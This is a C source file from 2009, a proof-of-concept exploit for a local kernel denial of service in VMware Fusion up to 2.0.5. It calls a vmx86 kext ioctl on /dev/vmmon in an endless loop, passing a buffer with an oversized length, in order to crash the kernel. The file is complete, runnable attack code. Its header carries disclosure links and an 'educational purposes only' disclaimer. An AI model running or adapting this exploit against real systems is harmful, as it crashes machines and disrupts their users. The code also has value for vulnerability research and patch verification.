/* vmware-pop.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * VMware Fusion <= 2.0.5 vmx86 kext local denial of service POC
 * by mu-b - Mon 22 June 2009
 *
 * - Tested on: VMware Fusion 2.0.4 (10.5.x)
 *              VMware Fusion 2.0.5 (10.5.x)
 *
 * http://seclists.org/fulldisclosure/2009/Oct/29
 * http://lists.vmware.com/pipermail/security-announce/2009/000066.html
 *
 * - this exploit is provided for educational purposes _only_. You are free
 *   to use this code in any way you wish provided you do not work for, or
 *   are associated in any way with Portcullis Computer Security Ltd.
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define VMX86_IOCTL       0x80045643

struct ioctl_req {
  struct ioctl_req_buf *uaddr;
};

struct ioctl_req_buf {
  char pad[0x8];
  int len;
  char _pad[0xC];
};

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  struct ioctl_req_buf buf;
  int fd, r;

  printf ("VMware Fusion <= 2.0.5 vmx86 kext local kernel denial of service PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  fd = open ("/dev/vmmon", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: open failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  memset (&req, 0, sizeof req);
  req.uaddr = &buf;

  memset (&buf, 0x41, sizeof buf);
  buf.len = 0xAAAAAAA;

  printf ("* hitting...\n");
  while (1)
    r = ioctl (fd, VMX86_IOCTL, &req);

  /* not reachable!$%! */
  return (EXIT_SUCCESS);
}

